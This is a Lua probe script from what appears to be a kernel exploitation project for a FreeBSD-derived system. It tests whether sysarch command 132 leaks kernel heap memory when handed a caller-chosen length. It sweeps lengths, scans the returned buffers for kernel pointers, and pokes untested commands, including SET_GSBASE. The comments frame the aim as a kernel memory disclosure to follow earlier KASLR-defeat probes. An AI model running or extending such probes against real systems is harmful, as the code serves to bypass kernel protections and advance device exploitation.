-- CRASH_CLASS: LOW
-- PROBE 1449a: sysarch(165) command 132 with a caller-governed length
--
-- Context: the sysarch family is syscall 165 (docs/sysent-names-13.60.csv row 165, "sysarch",
--   handler_rva 0x265a18).  NOTE: 166 is rtprio, and probe 1448a called 166 by mistake -- it died on
--   its first call because rtprio was handed a struct pointer as its pid argument.  Nothing in 1448a
--   is a measurement of sysarch.
--
--   Only three commands have captures: 128 AMD64_GET_FSBASE (probe 42c/43c, returns a userland TCB
--   address 0x881068080), 130 AMD64_GET_GSBASE (43c, returns 0) and 132 AMD64_GET_XFPUSTATE (43c,
--   called as sysarch(132, buf) with a zeroed buffer and recording no write).  131 SET_GSBASE is
--   explicitly skipped by 43c as "dangerous" and has no capture anywhere.
--
--   Command 132 is the only member of the family that COPIES OUT.  FreeBSD's handler copies the
--   thread's saved FXSAVE/XSAVE area to a caller address and is supposed to bound the copy by the
--   size of that area or by the caller's length.  A port that passes the caller's length straight to
--   copyout copies whatever follows the save area inside the thread's PCB and the surrounding kernel
--   heap into userland -- a kernel memory disclosure, which is the single thing this project has
--   never obtained from any syscall output.
--
-- -- prior art: probes/phase10_untested_theories/43c_sysarch_gsbase.lua (calls 165 with 128/130/132;
--   132 gets a zeroed buffer and no length field), probes/phase9_kaslr_defeat/42c_kaslr_deep.lua
--   (GET_FSBASE returned 0x881068080), probes/phase17_new_vectors/87e_fsbase_safe.lua (165 with 130),
--   probes/phase17_new_vectors/80f_get_current_cs.lua (165 with 128/130), docs/ATTACK_SURFACE.md.
--   No probe has ever passed a length argument to 132 or called 131.
--
-- Discriminator: [B] asks for 0x40, 0x200, 0x240, 0x280, 0x400, 0x800, 0x1000 and 0x2000 bytes in
--   turn.  If the number of dwords the kernel writes tracks the request past 0x2C0 (the xsave area
--   plus its header), the copy is caller-governed and the tail of each answer is kernel memory.  A
--   saturating count, or EINVAL for the sizes above the save area, means the guard is present.
--   Every answer is scanned for kernel pointers (high half >= 0xFFFF8000) and for a 0x13371337 or
--   loader-shaped pattern, and the tail dwords are printed whenever more than 0x2C0 bytes land.

print("=== PROBE 1449a: SYSARCH 165 CMD 132 LENGTH ===")
print("")

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local SYSARCH = make_syscall(165)
local GETPID  = make_syscall(20)
local MAP     = make_syscall(477)

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function sgn(rv)
    local n = to_num(rv)
    if n < 0 then return -1 end
    return n
end
local function es()
    local ok, s = pcall(function() return get_error_string() end)
    if ok and type(s) == "string" then return s end
    return "errno?"
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end
    return -1
end
local function wd(a, v)
    return (pcall(function() memory.write_dword(a, uint64(v)) end))
end
local function wq(a, v)
    return (pcall(function() memory.write_qword(a, uint64(v)) end))
end
local function hex(n) return string.format("0x%08X", n) end

local function map(len, prot, flags, fd, off)
    local ok, va = pcall(function()
        return MAP(uint64(0), uint64(len), uint64(prot or 3),
                   uint64(flags or 0x1002), uint64(fd or 0xFFFFFFFF), uint64(off or 0))
    end)
    if not ok then return -1 end
    local n = to_num(va)
    if n < 0x10000 or n > 0x8000000000 then return -1 end
    return n
end

local pid = sgn(GETPID(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("canary getpid=%d", pid))
print("")

local p = map(0x10000, 3)
if p < 0 then print("mmap failed -- aborting"); return end
local ARGS = p + 0x0000        -- { void *addr; size_t len; }
local BUF  = p + 0x2000        -- 0xE000 bytes of wiped buffer

local SENT = 0xCCCCCCCC
local function wipe(base, len)
    local i = 0
    while i < len do wd(base + i, SENT); i = i + 4 end
end
local function changed(base, len)
    local n, first = 0, -1
    local i = 0
    while i < len do
        local v = rd(base + i)
        if v ~= SENT and v ~= -1 then
            n = n + 1
            if first < 0 then first = i end
        end
        i = i + 4
    end
    return n, first
end
local function kptrs(base, len)
    local out, n = {}, 0
    local i = 0
    while i < len do
        local v = rd(base + i)
        if v ~= SENT and v ~= -1 then
            local hi = math.floor(v / 4294967296)
            if hi >= 0xFFFF8000 or v == 0x13371337 then
                n = n + 1
                if n <= 10 then out[#out + 1] = string.format("+%04X=%s", i, hex(v)) end
            end
        end
        i = i + 4
    end
    return n, table.concat(out, " ")
end
local function dump(base, off, n)
    local parts = {}
    local i = 0
    while i < n do parts[#parts + 1] = hex(rd(base + off + i)); i = i + 4 end
    return table.concat(parts, " ")
end

--------------------------------------------------------------------------
-- [A] control: 128 GET_FSBASE, the only command with a prior measurement
--------------------------------------------------------------------------
print("[A] control: 165(128, buf)")
wipe(BUF, 0x200)
wq(ARGS, BUF)
local rvA = sgn(SYSARCH(uint64(128), uint64(ARGS), uint64(0), uint64(0), uint64(0), uint64(0)))
local nA, fA = changed(BUF, 0x200)
print(string.format("  165(128) rv=%-4s %-16s wrote %d dwords first=+%03X", tostring(rvA), es(), nA, fA))
-- GET_FSBASE returns the base in the return value, not through the pointer
local rvA2 = sgn(SYSARCH(uint64(128), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("  165(128, NULL) rv=%-4s %s   (ret value carried in rv)", tostring(rvA2), es()))
print("")

--------------------------------------------------------------------------
-- [B] shape B first: is 132's argument the destination pointer itself?
--------------------------------------------------------------------------
print("[B] shape B: 165(132, BUF) -- argument used directly as the destination")
local lens = {0x40, 0x200, 0x240, 0x280, 0x2C0, 0x400, 0x800, 0x1000, 0x2000}
wipe(BUF, 0x4000)
local rvB = sgn(SYSARCH(uint64(132), uint64(BUF), uint64(0), uint64(0), uint64(0), uint64(0)))
local nB, fB = changed(BUF, 0x4000)
print(string.format("  165(132, BUF) rv=%-4s %-16s wrote %d dwords first=+%04X", tostring(rvB), es(), nB, fB))
if nB > 0 then
    print(string.format("      head: %s", dump(BUF, 0, 0x40)))
    local nkB, kB = kptrs(BUF, 0x4000)
    print(string.format("      kptr=%d %s", nkB, kB))
end
print("")

--------------------------------------------------------------------------
-- [C] shape A: {addr,len} with a length sweep -- the real experiment
--------------------------------------------------------------------------
print("[C] shape A: 165(132, {BUF,len}) with a length sweep")
local li = 1
while li <= #lens do
    local len = lens[li]
    wipe(BUF, len)
    wq(ARGS, BUF)
    wq(ARGS + 8, len)
    local rv = sgn(SYSARCH(uint64(132), uint64(ARGS), uint64(0), uint64(0), uint64(0), uint64(0)))
    local n, first = changed(BUF, len)
    local nk, klist = kptrs(BUF, len)
    print(string.format("  len=%-6s rv=%-4s %-16s wrote %d/%d dwords first=+%03X kptr=%d",
        hex(len), tostring(rv), es(), n, math.floor(len / 4), first, nk))
    if n > 0 then
        print(string.format("      head: %s", dump(BUF, 0, 0x40)))
        if n * 4 > 0x2C0 then
            -- print the region past the largest plausible save area
            print(string.format("      past 0x2C0: %s", dump(BUF, 0x2C0, 0x80)))
        end
        if nk > 0 then print(string.format("      kptrs: %s", klist)) end
    end
    li = li + 1
end
print("")

--------------------------------------------------------------------------
-- [D] unknown commands 133-140 and the untested setter 131 (last: it changes
--     this thread's %gs base)
--------------------------------------------------------------------------
print("[D] commands 133-140, {BUF,0x100}")
local c = 133
while c <= 140 do
    wipe(BUF, 0x400)
    wq(ARGS, BUF)
    wq(ARGS + 8, 0x100)
    local rv = sgn(SYSARCH(uint64(c), uint64(ARGS), uint64(0), uint64(0), uint64(0), uint64(0)))
    local n, first = changed(BUF, 0x400)
    print(string.format("  165(%d) rv=%-4s %-16s wrote %d dwords first=+%03X head: %s",
        c, tostring(rv), es(), n, first, dump(BUF, 0, 0x10)))
    c = c + 1
end
print("")
print("[D2] 131 SET_GSBASE to a user page (last)")
wq(ARGS, BUF)
local rvS = sgn(SYSARCH(uint64(131), uint64(ARGS), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("  165(131, BUF) rv=%-4s %s", tostring(rvS), es()))
wq(ARGS, 0)
wq(ARGS + 8, 0)
local rvG = sgn(SYSARCH(uint64(130), uint64(ARGS), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("  165(130) rv=%-4s %-16s arg=%s", tostring(rvG), es(), hex(rd(ARGS))))
print("")

print(string.format("[E] survivor pid=%d (was %d)", sgn(GETPID(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))), pid))
print("")
print("=== PROBE 1449a COMPLETE ===")
